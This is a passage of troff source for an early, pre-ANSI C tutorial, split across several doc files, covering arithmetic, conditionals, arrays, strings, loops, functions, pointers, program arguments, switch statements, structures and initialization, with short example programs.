This is because in the absence of parentheses the assignment operator `='
is evaluated after the relational operator `!='.
When in doubt, or even if not,
parenthesize.
.PP
Since
.UL putchar(c)
returns
.UL c
as its function value,
we could also copy the input to the output by nesting the calls to
.UL getchar
and
.UL putchar:
.E1
main(~) {
	while( putchar(getchar(~)) != '\\0' ) ;
}
.E2
What statement is being repeated?~
None, or technically, the
.ul
null
statement,
because all the work is really done within the test part of the
.UL while\*.
This version is slightly different from the previous one,
because the final `\\0' is copied to the output
before we decide to stop.
.NH
Arithmetic
.PP
The arithmetic operators are the usual `+', `\(mi', `*', and `/'
(truncating integer division if the operands are
both
.UL int),
and the remainder or mod operator `%':
.E1
x = a%b;
.E2
sets
.UL x
to the remainder after
.UL a
is divided by
.UL b
(i.e.,
.UL a
.UL mod
.UL b)\*.
The results are machine dependent unless
.UL a
and
.UL b
are both positive.
.PP
In arithmetic,
.UL char
variables can usually be treated like
.UL int
variables.
Arithmetic on characters
is quite legal, and often makes sense:
.E1
c = c + 'A' - 'a';
.E2
converts a single lower case ascii character stored in
.UL c
to upper case,
making use of the fact that
corresponding ascii letters are a fixed distance apart.
The rule governing this arithmetic is that all
.UL chars
are converted to
.UL int
before the arithmetic is done.
Beware that conversion may involve sign-extension _
if the leftmost bit of a character is 1,
the resulting integer might be negative.
(This doesn't happen with genuine characters on any current machine.)
.PP
So to convert a file into lower case:
.E1
main( ) {
	char c;
	while( (c=getchar( )) != '\\0' )
		if( 'A'<=c && c<='Z' )
			putchar(c+'a'-'A');
		else
			putchar(c);
}
.E2
Characters have different sizes on different machines.
Further, this code won't work
on an IBM machine,
because the letters
in the ebcdic alphabet are not contiguous.
.NH
Else Clause; Conditional Expressions
.PP
We just used an
.UL else
after an 
.UL if\*.
The most general form of
.UL if
is
.E1
if (expression) statement1 else statement2
.E2
the
.UL else
part is optional, but often useful.
The canonical example sets
.UL x
to the
minimum of
.UL a
and
.UL b:
.E1
.ne 4
if (a < b)
	x = a;
else
	x = b;
.E2
Observe that there's a semicolon after
.UL x=a\*.
.PP
C provides an alternate form of conditional which is often more
concise.
It is called the ``conditional expression'' because it is a conditional
which actually has a value
and can be used anywhere an expression can.
The value of
.E1
a<b ? a : b;
.E2
is
.UL a
if
.UL a
is less than
.UL b;
it is
.UL b
otherwise.
In general, the form
.E1
expr1 ? expr2 : expr3
.E2
means
``evaluate
.UL expr1\*.
If it is not zero, the value of the whole thing is
.UL expr2;
otherwise the value is
.UL expr3\*.''
.PP
To set
.UL x
to the minimum of
.UL a
and
.UL b,
then:
.E1
x = (a<b ? a : b);
.E2
The parentheses aren't necessary because 
.UL `?:'
is evaluated before `=',
but safety first.
.PP
Going a step further,
we could write the loop in the lower-case program as
.E1
while( (c=getchar( )) != '\\0' )
	putchar( ('A'<=c && c<='Z') ? c-'A'+'a' : c );
.E2
.PP
.UL If's
and
.UL else's
can be used to construct logic that
branches one of several ways and then rejoins, a common
programming structure, in this way:
.E1
if(\*.\*.\*.)
	{\*.\*.\*.}
else if(\*.\*.\*.)
	{\*.\*.\*.}
else if(\*.\*.\*.)
	{\*.\*.\*.}
else
	{\*.\*.\*.}
.E2
The conditions are tested in order,
and exactly one block is executed _ either the first one whose
.UL if
is satisfied,
or the one for the last
.UL else\*.
When this block is finished,
the next statement executed is the one after the last
.UL else\*.
If no action is to be taken for the ``default'' case,
omit
the last
.UL else\*.
.PP
For example, to count letters, digits and others in a file,
we could write
.E1
.ne 9
main( ) {
	int let, dig, other, c;
	let = dig = other = 0;
	while( (c=getchar( )) != '\\0' )
		if( ('A'<=c && c<='Z') \*| ('a'<=c && c<='z') )  \*+let;
		else if( '0'<=c && c<='9' )  \*+dig;
		else  \*+other;
	printf("%d letters, %d digits, %d others\\n", let, dig, other);
}
.E2
The
`++' operator means
``increment
by 1'';
we will get to it in the next section.
-- /usr/doc/ctut/ct3 mode=0110664 uid=3 gid=3 atime=170478284 mtime=173059636 --
.NH
Increment and Decrement Operators
.PP
In addition to the usual
`\(mi',
C also has two other interesting
unary
operators, `++' (increment) and `\(mi\(mi' (decrement).
Suppose we want to count the lines
in a file.
.E1
main( ) {
	int c,n;
	n = 0;
	while( (c=getchar( )) != '\\0' )
		if( c \*= '\\n' )
			\*+n;
	printf("%d lines\\n", n);
}
.E2
.UL \*+n 
is equivalent to
.UL n=n+1
but clearer,
particularly when
.UL n
is a complicated expression.
`++' and `\(mi\(mi' can be applied only to
.UL int's
and
.UL char's
(and
.UL pointers
which we haven't got to yet).
.PP
The unusual feature of `++' and `\(mi\(mi' is that they
can be used either before or after a variable.
The value of
.UL \*+k
is the value of
.UL k
.ul
after
it has been incremented.
The value of
.UL k\*+
is
.UL k
.ul
before
it is incremented.
Suppose
.UL k
is 5.
Then
.E1
x = \*+k;
.E2
increments
.UL k
to 6 and then sets
.UL x
to
the resulting value,
i.e., to 6.
But
.E1
x = k\*+;
.E2
first sets
.UL x
to
to 5,
and
.ul
then
increments
.UL k
to 6.
The incrementing effect of
.UL \*+k
and
.UL k\*+
is the same,
but their values are respectively 5 and 6.
We shall soon see examples where both of these uses are important.
.NH
Arrays
.PP
In C, as in Fortran or PL/I, it is possible to make arrays
whose elements are basic types.
Thus we can make an array of 10
integers
with the declaration
.E1
int x[10];
.E2
The square brackets
mean
.ul
subscripting;
parentheses are used only for function references.
Array indexes begin at 
.ul
zero,
so the elements of
.UL x
are
.E1
x[0], x[1], x[2], \*.\*.\*., x[9]
.E2
If an array has
.UL n
elements, the largest subscript is
.UL n\(mi1\*.
.PP
Multiple-dimension arrays are provided,
though not much used above two dimensions.
The declaration and use look like
.E1
int name[10] [20];
n = name[i+j] [1] + name[k] [2];
.E2
Subscripts can be arbitrary integer expressions.
Multi-dimension arrays are stored by row (opposite to Fortran),
so the rightmost subscript varies fastest;
.UL name
has 10 rows and 20 columns.
.PP
Here is a program which reads a line,
stores it in a buffer,
and prints its length (excluding the newline at the end).
.E1
.ne 8
main( ) {
	int n, c;
	char line[100];
	n = 0;
	while( (c=getchar( )) != '\\n' ) {
		if( n < 100 )
			line[n] = c;
		n\*+;
	}
	printf("length = %d\\n", n);
}
.E2
.PP
As a more complicated problem,
suppose we want to print the count for each line in the input,
still storing the first 100 characters of each line.
Try it as an exercise before looking at the solution:
.E1
main( ) {
	int n, c; char line[100];
	n = 0;
	while( (c=getchar( )) != '\\0' ) 
		if( c \*= '\\n' ) {
			printf("%d\n", n);
			n = 0;
		}
		else {
			if( n < 100 ) line[n] = c;
			n\*+;
		}
}
.E2
.NH
Character Arrays; Strings
.PP
Text is usually kept as an array of characters,
as we did with
.UL line[ 
.UL ]
in the example above.
By convention in C,
the last character in a character array should be a `\\0'
because most programs that manipulate character arrays
expect it.
For example,
.UL printf
uses the `\\0' to detect the end of a character array
when printing it out with a `%s'.
.PP
We can copy a character array
.UL s
into another
.UL t
like this:
.E1
	i = 0;
	while( (t[i]=s[i]) != '\\0' )
		i\*+;
.E2
.PP
Most of the time we have to put in our own `\\0' at the end of a string;
if we want to print the line with
.UL printf,
it's necessary.
This code prints the character count before the line:
.E1
main( ) {
	int n;
	char line[100];
	n = 0;
	while( (line[n\*+]=getchar( )) != '\\n' );
	line[n] = '\\0';
	printf("%d:\\t%s", n, line);
}
.E2
Here we increment 
.UL n
in the subscript itself,
but only after the previous value has been used.
The character is read, placed in 
.UL line[n],
and only then
.UL n
is incremented.
.PP
There is one place and one place only
where C puts in the `\\0' at the end of a character array for you,
and that is in the construction
.E1
"stuff between double quotes"
.E2
The compiler puts a `\\0' at the end automatically.
Text enclosed in double quotes is called a
.ul
string;
its properties are precisely those of an (initialized) array of characters.
.NH
For Statement
.PP
The
.UL for
statement is a somewhat generalized
.UL while
that lets us put the initialization and increment parts
of a loop into a single statement along with the test.
The general form of the
.UL for
is
.E1
for( initialization; expression; increment )
	statement
.E2
The meaning is exactly
.E1
	initialization;
	while( expression ) {
		statement
		increment;
	}
.E2
Thus, the following code does the same array copy as the example in the previous section:
.E1
	for( i=0; (t[i]=s[i]) != '\\0'; i\*+ );
.E2
This slightly more
ornate example adds up the elements of an array:
.E1
	sum = 0;
	for( i=0; i<n; i\*+)
		sum = sum + array[i];
.E2
.PP
In the
.UL for
statement,
the initialization
can be left out if you want,
but the semicolon has to be there.
The increment is
also optional.
It is
.ul
not
followed by a semicolon.
The second clause, the test,
works the same way as in the
.UL while:
if the expression is true (not zero)
do another loop,
otherwise get on with the next statement.
As with the
.UL while,
the
.UL for
loop may be done zero times.
If the expression is left out, it is taken to be always true, so
.E1
for( ; ; ) \*.\*.\*.
.E2
and
.E1
while( 1 ) \*.\*.\*.
.E2
are both infinite loops.
.PP
You might ask why we use a
.UL for
since it's so much like a
.UL while\*.
(You might also ask why we use a
.UL while
because...)
The
.UL for 
is usually preferable because it keeps the code where it's used
and sometimes eliminates the need for compound statements,
as in this code that zeros a two-dimensional array:
.E1
for( i=0; i<n; i\*+ )
	for( j=0; j<m; j\*+ )
		array[i][j] = 0;
.E2
.NH
Functions; Comments
.PP
Suppose we want,
as part of a larger program,
to count the occurrences of the ascii
characters in some input text.
Let us also map illegal characters
(those with value>127 or <0) into one pile.
Since this is presumably an isolated part of the program,
good practice dictates making it a separate function.
Here is one way:
.E1
.ne 7
main(~) {
	int hist[129];		/\** 128 legal chars + 1 illegal group \**/
	\*.\*.\*.
	count(hist, 128);	/\** count the letters into hist \**/
	printf( \*.\*.\*. );		/\** comments look like this; use them \**/
	\*.\*.\*.		/\** anywhere blanks, tabs or newlines could appear \**/
}
.SP
count(buf, size)
   int size, buf[ ]; {
	int i, c;
	for( i=0; i<=size; i\*+ )
		buf[i] = 0;			/\** set buf to zero \**/
	while( (c=getchar(~)) != '\\0' ) {	/\** read til eof \**/
		if( c > size \*| c < 0 )
			c = size;		/\** fix illegal input \**/
		buf[c]\*+;
	}
	return;
}
.E2
We have already seen many examples of calling a function,
so let us concentrate on how to 
.ul
define
one.
Since 
.UL count
has two arguments, we need to declare them,
as shown,
giving their types, and in the case of
.UL buf,
the fact
that it is an array.
The declarations of arguments go
.ul
between
the argument list
and the opening `{'.
There is no need to specify the size of the array 
.UL buf,
for it is defined outside of
.UL count\*.
.PP
The
.UL return
statement simply says to go back to the calling routine.
In fact, we could have omitted it,
since a return is implied at the end of a function.
.PP
What if we wanted 
.UL count
to return a value, say the number of characters read?~
The 
.UL return
statement allows for this too:
.E1
	int i, c, nchar;
	nchar = 0;
	\*.\*.\*.
	while( (c=getchar(~)) != '\\0' ) {
		if( c > size \*| c < 0 )
			c = size;
		buf[c]\*+;
		nchar\*+;
	}
	return(nchar);
.E2
Any expression can appear within the parentheses.
Here is a function to compute the minimum of two integers:
.E1
.ne 4
min(a, b)
   int a, b; {
	return( a < b ? a : b );
}
.E2
.PP
.PP
To copy a character array,
we could write the function
.E1
.ne 5
strcopy(s1, s2)		/\** copies s1 to s2 \**/
   char s1[ ], s2[ ]; {
	int i;
	for( i = 0; (s2[i] = s1[i]) != '\\0'; i\*+ );
}
.E2
As is often the case, all the work is done by the assignment statement
embedded in the test part of the
.UL for\*.
Again, the declarations of the arguments 
.UL s1 
and
.UL s2
omit the sizes, because they don't matter to
.UL strcopy\*.
(In the section on pointers, we will see a more efficient
way to do a string copy.)
.PP
There is a subtlety
in function usage which can trap the unsuspecting Fortran programmer.
Simple variables (not arrays) are passed in C by
``call by value'',
which means that the called function is given
a copy of its arguments,
and doesn't know their addresses.
This makes it impossible to change the value of one of the actual input arguments.
.a
.PP
There are two ways out of this dilemma.
One is to make special arrangements to pass to the function
the address of a variable instead of its value.
The other is to make the variable a global or external variable,
which is known to each function by its name.
We will discuss both possibilities in the next few sections.
.NH
Local and External Variables
.PP
If we say
.E1
f( ) {
	int x;
	\*.\*.\*.
}
g( ) {
	int x;
	\*.\*.\*.
}
.E2
each 
.UL x
is
.ul
local
to its own routine _
the
.UL x
in
.UL f
is unrelated to the
.UL x
in
.UL g\*.
(Local variables are also called ``automatic''.)
Furthermore each local variable in a routine appears only when
the function is called, and
.ul
disappears
when the function is exited.
Local variables have no memory from one call to the next
and must be explicitly initialized upon each entry.
(There is a
.UL static
storage class for making local variables with memory;
we won't discuss it.)
.PP
As opposed to local variables,
.ul
external variables
are defined external to all functions,
and are (potentially) available to all functions.
External storage
.ne 6
always remains in existence.
To make variables external we have to
.ul
define
them external to all functions,
and, wherever we want to use them,
make a
.ul
declaration.
.E1
main(~) {
	extern int nchar, hist[ ];
	\*.\*.\*.
	count(~);
	\*.\*.\*.
}
.SP
.ne 7
count(~) {
	extern int nchar, hist[ ];
	int i, c;
	\*.\*.\*.
}
.SP
int	hist[129];	/\** space for histogram \**/
int	nchar;		/\** character count \**/
.E2
Roughly speaking, any function that wishes to access an external variable
must contain an
.UL extern
declaration
for it.
The declaration is the same as others,
except for the added keyword
.UL extern\*.
Furthermore, there must somewhere be a
.ul
definition
of the external variables external to all functions.
.PP
External variables can be initialized;
they are set to zero if not explicitly
initialized.
In its simplest form,
initialization is done by putting the value (which must be a constant) after the definition:
.E1
int	nchar	0;
char	flag	'f';
.ft R
  etc\*.
.E2
This is discussed further in a later section.
.SP
.PP
This ends our discussion of what might be called
the central core of C.
You now have enough to write quite substantial
C programs,
and it would probably be a good idea if you paused
long enough to do so.
The rest of this tutorial
will describe some more ornate constructions,
useful but not essential.
.SP
.SP
-- /usr/doc/ctut/ct4 mode=0110664 uid=3 gid=3 atime=170478285 mtime=173059636 --
.NH
Pointers
.PP
A
.ul
pointer
in C is the address of something.
It is a rare case indeed when we care what
the specific address itself is,
but pointers are a quite common way to get at
the contents of something.
The unary operator `&' is used to produce the address of
an object, if it has one. Thus
.E1
	int a, b;
	b = &a;
.E2
puts the address of
.UL a
into
.UL b\*.
We can't do much with it except print it or pass it
to some other routine, because we haven't given
.UL b
the right kind of declaration.
But if we declare that
.UL b
is indeed a
.ul
pointer
to an integer, we're in good shape:
.E1
	int a, \**b, c;
	b = &a;
	c = \**b;
.E2
.UL b
contains the address of
.UL a
and
.UL `c 
.UL =
.UL \**b'
means to use the value in
.UL b
as an address, i.e., as a pointer.
The effect is that we get back the contents of 
.UL a,
albeit rather indirectly.
(It's always the case that 
.UL `\**&x'
is the same as
.UL x
if
.UL x
has an address.)
.PP
The most frequent use of pointers in C is for walking
efficiently along arrays.
In fact,
in the implementation of an array,
the array name
represents the address of the zeroth element of the array,
so you can't use it on the left side of an expression.
(You can't change the address of something by assigning to it.)
If we say
.E1
char \**y;
char x[100];
.E2
.UL y
is of type pointer to character
(although it doesn't yet point anywhere).
We can make 
.UL y
point to
an element of
.UL x
by either of
.E1
y = &x[0];
y = x;
.E2
Since 
.UL x
is the address of
.UL x[0]
this is legal and consistent.
.PP
Now 
.UL `\**y'
gives
.UL x[0]\*.
More importantly,
.E1
\**(y+1)	gives x[1]
\**(y+i)	gives x[i]
.E2
and the sequence
.E1
	y = &x[0];
	y\*+;
.E2
leaves 
.UL y
pointing at
.UL x[1]\*.
.PP
Let's use pointers
in a function
.UL length
that computes how long a character array is.
Remember that by convention all character arrays are
terminated with a `\\0'.
(And if they aren't, this program will blow up inevitably.)
The old way:
.E1
length(s)
   char s[ ]; {
	int n;
	for( n=0; s[n] != '\\0'; )
		n\*+;
	return(n);
}
.E2
Rewriting with pointers gives
.E1
length(s)
   char \**s; {
	int n;
	for( n=0; \**s != '\\0'; s\*+ )
		n\*+;
	return(n);
}
.E2
You can now see why we have to say what kind of thing
.UL s
points to _
if we're to increment it with
.UL s\*+
we have to increment it by the right amount.
.PP
The pointer version is more efficient
(this is almost always true)
but even more compact is
.E1
	for( n=0; \**s\*+ != '\\0'; n\*+ );
.E2
The 
.UL `\**s'
returns a character;
the
.UL `\*+'
increments the pointer so we'll get the next character
next time around.
As you can see, as we make things more efficient,
we also make them less clear.
But
.UL `\**s\*+'
is an idiom so common
that you have to know it.
.PP
Going a step further,
here's our function
.UL strcopy
that copies a character array
.UL s
to another
.UL t\*.
.E1
strcopy(s,t)
   char \**s, \**t; {
	while(\**t\*+ = \**s\*+);
}
.E2
We have omitted the test against `\\0',
because `\\0' is identically zero;
you will often see the code this way.
(You 
.ul
must
have a space after the `=':
see section 25.)
.PP
For arguments
to a function, and there only,
the declarations
.E1
char s[ ];
char \**s;
.E2
are equivalent _ a pointer to a type,
or an array of unspecified size of that type, are the same thing.
.PP
If this all seems mysterious, copy these forms until they become second nature.
You don't often need anything more complicated.
.NH
Function Arguments
.PP
Look back at the function
.UL strcopy
in the previous section.
We passed it two string names as arguments, then proceeded
to clobber both of them by incrementation.
So how come we don't lose the original strings
in the function that called
.UL strcopy?
.PP
As we said before,
C is a ``call by value'' language:
when you make a function call like
.UL f(x),
the
.ul
value
of
.UL x
is passed,
not its address.
So there's no way to 
.ul
alter
.UL x
from inside
.UL f\*.
If
.UL x
is an array
.UL (char 
.UL x[10])
this isn't a problem, because
.UL x
.ul
is
an address anyway,
and you're not trying to change it,
just what it addresses.
This is why
.UL strcopy
works as it does.
And it's convenient not to have to worry about
making temporary copies of the input arguments.
.PP
But what if
.UL x
is a scalar and
you do want to change it?
In that case,
you have to pass the
.ul
address
of
.UL x
to
.UL f,
and then use it as a pointer.
Thus for example, to interchange two integers, we must write
.E1
flip(x, y)
   int \**x, \**y; {
	int temp;
	temp = \**x;
	\**x = \**y;
	\**y = temp;
}
.E2
and to call 
.UL flip,
we have to pass the addresses of the variables:
.E1
flip (&a, &b);
.E2
.NH
Multiple Levels of Pointers; Program Arguments
.PP
When a C program is called,
the arguments on the command line are made available
to the main program as an argument count
.UL argc
and an array of character strings
.UL argv
containing the arguments.
Manipulating these arguments is one of the most common uses of
multiple levels of pointers
(``pointer to pointer to ...'').
By convention,
.UL argc
is greater than zero;
the first argument
(in
.UL argv[0])
is the command name itself.
.PP
Here is a program that simply echoes its arguments.
.E1
main(argc, argv)
   int argc;
   char \**\**argv; {
	int i;
	for( i=1; i < argc; i\*+ )
		printf("%s ", argv[i]);
	putchar('\\n');
}
.E2
Step by step:
.UL main
is called with two arguments,
the argument count and the array of arguments.
.UL argv
is a pointer to an array,
whose individual elements are pointers to arrays of characters.
The zeroth argument is the name of the command itself,
so we start to print 
with the first argument, until we've printed them all.
Each 
.UL argv[i]
is a character array, so we use a
.UL `%s'
in the
.UL printf\*.
.PP
You will sometimes see the declaration of
.UL argv
written as
.E1
char \**argv[ ];
.E2
which is equivalent.
But we can't use 
.UL char 
.UL argv[ 
.UL ][
.UL ],
because both dimensions are variable and
there would be no way to figure
out how big the array is.
.PP
Here's a bigger example using
.UL argc
and
.UL argv\*.
A common convention in C programs is that 
if the first argument is `\(mi',
it indicates a flag of some sort.
For example, suppose we want a program to be callable as
.E1
prog -abc arg1 arg2 \*.\*.\*.
.E2
where the `\(mi' argument is optional;
if it is present, it may be followed by any combination of
a, b, and c.
.E1
main(argc, argv)
   int argc;
   char \**\**argv; {
	\*.\*.\*.
	aflag = bflag = cflag  = 0;
	if( argc > 1 && argv[1][0] \*= '-' ) {
		for( i=1; (c=argv[1][i]) != '\\0'; i\*+ )
			if( c\*='a' )
				aflag\*+;
			else if( c\*='b' )
				bflag\*+;
			else if( c\*='c' )
				cflag\*+;
			else
				printf("%c?\\n", c);
		--argc;
		\*+argv;
	}
	\*.\*.\*.
.E2
.PP
There are several things worth noticing about this code.
First, there is a real need for the left-to-right evaluation
that && provides;
we don't want to look at
.UL argv[1]
unless we know it's there.
Second, the statements
.E1
	--argc;
	\*+argv;
.E2
let us march along the argument list by one position,
so we can skip over the flag argument as if it had never existed _
the rest of the program is independent of
whether or not there was a flag argument.
This only works because 
.UL argv
is a pointer which can be incremented.
.NH
The Switch Statement; Break; Continue
.PP
The
.UL switch
statement
can be used to replace the multi-way test
we used in the last example.
When the tests are like this:
.E1
if( c \*= 'a' ) \*.\*.\*.
else if( c \*= 'b' ) \*.\*.\*.
else if( c \*= 'c' ) \*.\*.\*.
else \*.\*.\*.
.E2
testing a value against a series of
.ul
constants,
the
switch
statement is often clearer and usually gives better code.
Use it like this:
.E1
switch( c ) {

case 'a':
	aflag\*+;
	break;
case 'b':
	bflag\*+;
	break;
case 'c':
	cflag\*+;
	break;
default:
	printf("%c?\\n", c);
	break;
}
.E2
The
.UL case
statements label the various actions we want;
.UL default
gets done if none of the other cases are satisfied.
(A
.UL default
is optional;
if it isn't there,
and none of the cases match,
you just fall out the bottom.)
.PP
The
.UL break
statement in this example is new.
It is there
because
the cases are just labels,
and after you do one of them,
you
.ul
fall through
to the next unless you take some explicit action to escape.
This is a mixed blessing.
On the positive side,
you can have multiple cases on a single statement;
we might want to allow both upper and lower case letters in our flag field,
so we could say
.E1
case 'a':  case 'A':	\*.\*.\*.
.SP
case 'b':  case 'B':	\*.\*.\*.
 etc\*.
.E2
But what if we just want to get out 
after doing
.UL case 
.UL `a'
?
We could get out of a
.UL case
of the
.UL switch
with a label and a
.UL goto,
but this is really ugly.
The
.UL break
statement lets us exit without either
.UL goto
or label.
.E1
switch( c ) {

case 'a':
	aflag\*+;
	break;
case 'b':
	bflag\*+;
	break;
 \*.\*.\*.
}
/\** the break statements get us here directly \**/
.E2
The
.UL break
statement
also works in
.UL for
and
.UL while
statements _
it causes an immediate exit from the loop.
.PP
The
.UL continue
statement works
.ul
only
inside
.UL for's
and
.UL while's;
it causes the next iteration of the loop to be started.
This means it goes to the increment part of the
.UL for
and the test part of the
.UL while\*.
We could have used a
.UL continue
in our example to get on with the next iteration
of the
.UL for,
but it seems clearer to use
.UL break
instead.
-- /usr/doc/ctut/ct5 mode=0110664 uid=3 gid=3 atime=170478285 mtime=173059636 --
.NH
Structures
.PP
The main use of structures is to lump together
collections of disparate variable types,
so they can conveniently be treated as a unit.
For example,
if we were writing a compiler or assembler,
we might need for each identifier information like
its name (a character array),
its source line number (an integer),
some type information (a character, perhaps),
and probably a usage count (another integer).
.E1
	char	id[10];
	int	line;
	char	type;
	int	usage;
.E2
.PP
We can make a structure out of this quite easily.
We first tell C what the structure will look
like,
that is, what kinds of things it contains;
after that we can actually reserve storage for it,
either in the same statement or separately.
The simplest thing is to define it and allocate
storage all at once:
.E1
struct {
	char	id[10];
	int	line;
	char	type;
	int	usage;
} sym;
.E2
.PP
This defines
.UL sym
to be a structure with the specified shape;
.UL id,
.UL line,
.UL type
and
.UL usage
are
.ul
members
of the structure.
The way we refer to any particular member of the structure
is
.E1
structure\(hyname \*. member
.E2
as in
.E1
	sym\*.type = 077;
	if( sym\*.usage \*= 0 ) \*.\*.\*.
	while( sym\*.id[j\*+] ) \*.\*.\*.
.ft R
	   etc\*.
.E2
Although the names of structure members never stand alone,
they still have to be unique _
there can't be another
.UL id
or
.UL usage
in some other structure.
.PP
So far we haven't gained much.
The advantages of structures start to come
when we have arrays of structures,
or when we want to pass complicated data layouts
between functions.
Suppose we wanted to make a symbol table for up
to 100 identifiers.
We could extend our definitions like
.E1
	char	id[100][10];
	int	line[100];
	char	type[100];
	int	usage[100];
.E2
but a structure lets us
rearrange this spread-out information
so all the data about a single identifer is collected
into one lump:
.E1
struct {
	char	id[10];
	int	line;
	char	type;
	int	usage;
} sym[100];
.E2
This makes
.UL sym
an array of structures;
each array element has the specified shape.
Now we can refer to members as
.E1
	sym[i]\*.usage\*+;	/\** increment usage of i\(hyth identifier \**/
	for( j=0; sym[i]\*.id[j\*+] != '\\0'; ) \*.\*.\*.
.ft R
	   etc\*.
.E2
Thus to print a list of all identifiers that haven't been used,
together with their line number,
.E1
	for( i=0; i<nsym; i\*+ )
		if( sym[i]\*.usage \*= 0 )
			printf("%d\\t%s\\n", sym[i]\*.line, sym[i]\*.id);
.E2
.PP
Suppose we now want to write a function
.UL lookup(name)
which will tell us if 
.UL name
already exists in 
.UL sym,
by giving its index, or that it doesn't,
by returning a \(mi1.
We can't pass a structure to a function
directly _
we have to either define it externally, or
pass a pointer to it.
Let's try the first way first.
.E1
int	nsym	0;	/\** current length of symbol table \**/
.SP
struct {
	char	id[10];
	int	line;
	char	type;
	int	usage;
} sym[100];		/\** symbol table \**/
.SP
main( ) {
	\*.\*.\*.
	if( (index = lookup(newname)) >= 0 )
		sym[index]\*.usage\*+;		/\** already there \*.\*.\*. \**/
	else
		install(newname, newline, newtype);
	\*.\*.\*.
}
.SP
lookup(s)
   char \**s; {
	int i;
	extern struct {
		char	id[10];
		int	line;
		char	type;
		int	usage;
	} sym[ ];
.SP
	for( i=0; i<nsym; i\*+ )
		if( compar(s, sym[i]\*.id) > 0 )
			return(i);
	return(-1);
}

compar(s1,s2)		/\**  return 1 if s1\*=s2, 0 otherwise \**/
   char \**s1, \**s2; {
	while( \**s1\*+ \*= \**s2 )
		if( \**s2\*+ \*= '\\0' )
			return(1);
	return(0);
}
.E2
The declaration of the structure in 
.UL lookup
isn't needed if the external definition precedes its use in the same source file,
as we shall see in a moment.
.PP
Now what if we want to use pointers?
.E1
struct  symtag {
	char	id[10];
	int	line;
	char	type;
	int	usage;
} sym[100], \**psym;

	psym = &sym[0];	/\** or p = sym; \**/
.E2
This makes
.UL psym
a pointer to our kind of structure
(the symbol table),
then initializes it to point to the first element of
.UL sym\*.
.PP
Notice that we added something after the word
.UL struct:
a ``tag'' called 
.UL symtag\*.
This puts a name on our structure definition so we can
refer to it later without repeating the definition.
It's not necessary but useful.
In fact we could have said
.E1
struct	symtag {
	\*.\*.\*. structure definition
};
.E2
which wouldn't have assigned any storage at all,
and then said
.E1
struct	symtag	sym[100];
struct	symtag	\**psym;
.E2
which would define the array and the pointer.
This could be condensed further, to
.E1
struct	symtag	sym[100], \**psym;
.E2
.PP
The way we actually refer to an member of a structure by a pointer
is like this:
.E1
	ptr -> structure\(hymember
.E2
The symbol `\(mi>'
means we're pointing at a member of a structure;
`\(mi>' is only used in that context.
.UL ptr
is a pointer to the (base of) a structure
that contains the structure member.
The expression
.UL "ptr\(mi>structure\(hymember"
refers to the indicated member of the pointed-to structure.
Thus we have constructions like:
.E1
psym->type = 1;
psym->id[0] = 'a';
.E2
and so on.
.PP
For more complicated pointer expressions,
it's wise to use parentheses to make it clear
who goes with what.
For example,
.E1
struct { int x, \**y; } \**p;
p->x\*+	increments x
\*+p->x	so does this!
(\*+p)->x	increments p before getting x
\**p->y\*+	uses y as a pointer, then increments it
\**(p->y)\*+	so does this
\**(p\*+)->y	uses y as a pointer, then increments p
.E2
.tr |.
The way to remember these is that
.UL \(mi>,
.UL |
(dot),
.UL "( )"
and
.UL "[ ]"
bind very tightly.
An expression involving one of these is treated as a unit.
.tr ||
.UL p\(mi>x,
.UL a[i],
.UL y\*.x
and
.UL f(b)
are names
exactly as
.UL abc
is.
.PP
If 
.UL p
is a pointer to a structure,
any arithmetic on
.UL p
takes into account the acutal size of the structure.
For instance,
.UL p\*+
increments
.UL p
by the correct amount to get the next element of the array of structures.
But don't assume that the size of a structure is the sum
of the sizes of its members _
because of alignments of different sized objects,
there may be ``holes'' in a structure.
.PP
Enough theory. Here is the lookup example, this time with pointers.
.E1
struct symtag {
	char	id[10];
	int	line;
	char	type;
	int	usage;
} sym[100];
.SP
main( ) {
	struct symtag \**lookup( );
	struct symtag \**psym;
	\*.\*.\*.
	if( (psym = lookup(newname)) )	/\** non-zero pointer \**/
		psym -> usage\*+;		/\** means already there \**/
	else
		install(newname, newline, newtype);
	\*.\*.\*.
}
.SP
struct symtag \**lookup(s)
   char \**s; {
	struct symtag \**p;
	for( p=sym; p < &sym[nsym]; p\*+ )
		if( compar(s, p->id) > 0)
			return(p);
	return(0);
}
.E2
The function
.UL compar
doesn't change:
.UL `p\(mi>id'
refers to
a string.
.PP
In
.UL main
we test the pointer returned by
.UL lookup
against zero,
relying on the fact that a pointer is by definition never zero
when it really points at something.
The other pointer manipulations are trivial.
.PP
The only complexity is the set of lines like
.E1
struct symtag \**lookup( );
.E2
This brings us to
an area that we will
treat only hurriedly _ the question of function types.
So far, all of our functions have returned integers
(or characters, which are much the same).
What do we do when the function returns something else,
like a pointer to a structure?
The rule is that
any function that doesn't return an
.UL int
has to say explicitly what it does return.
The type information goes before the function name
(which can make the name hard to see).
Examples:
.E1
char f(a)
   int a; {
	\*.\*.\*.
}

int \**g( ) { \*.\*.\*. }

struct symtag \**lookup(s) char \**s; { \*.\*.\*. }
.E2
The function
.UL f
returns a character,
.UL g
returns a pointer to an integer,
and
.UL lookup
returns a pointer to a structure that looks like
.UL symtag\*.
And if we're going to use one of these functions,
we have to make a declaration
where we use it,
as we did in
.UL main
above.
.PP
Notice th parallelism between the declarations
.E1
	struct symtag \**lookup( );
	struct symtag \**psym;
.E2
In effect, this says that
.UL lookup(~)
and
.UL psym
are both used the same way _
as a pointer to a strcture _
even though one is a variable and the other is a function.
-- /usr/doc/ctut/ct6 mode=0100664 uid=3 gid=3 atime=170478286 mtime=173059636 --
.NH
Initialization of Variables
.PP
An external variable may be initialized at compile time
by following its name with an initializing value
when it is defined.
The initializing value has to be something whose value is known at compile time,
like a constant.
.E1
int	x	0;	/\** "0" could be any constant \**/
int	a	'a';
char	flag	0177;
int	\**p	&y[1];	/\** p now points to y[1] \**/
.E2
An external array can be initialized by following its name with
a list of initializations enclosed in braces:
.E1
int	x[4]	{0,1,2,3};		/\** makes x[i] = i \**/
int	y[ ]	{0,1,2,3};		/\** makes y big enough for 4 values \**/
char	\**msg	"syntax error\\n";	/\** braces unnecessary here \**/
char \**keyword[ ]{
	"if",
	"else",
	"for",
	"while",
	"break",
	"continue",
	0
};
.E2
This last one is very useful _
it makes 
.UL keyword
an array of pointers to character strings,
with a zero at the end so we can identify the
last element easily.
A simple lookup routine could scan this until
it either finds a match or encounters a zero keyword pointer:
.E1
lookup(str)		/\** search for str in keyword[ ] \**/
   char \**str; {
	int i,j,r;
	for( i=0; keyword[i] != 0; i\*+) {
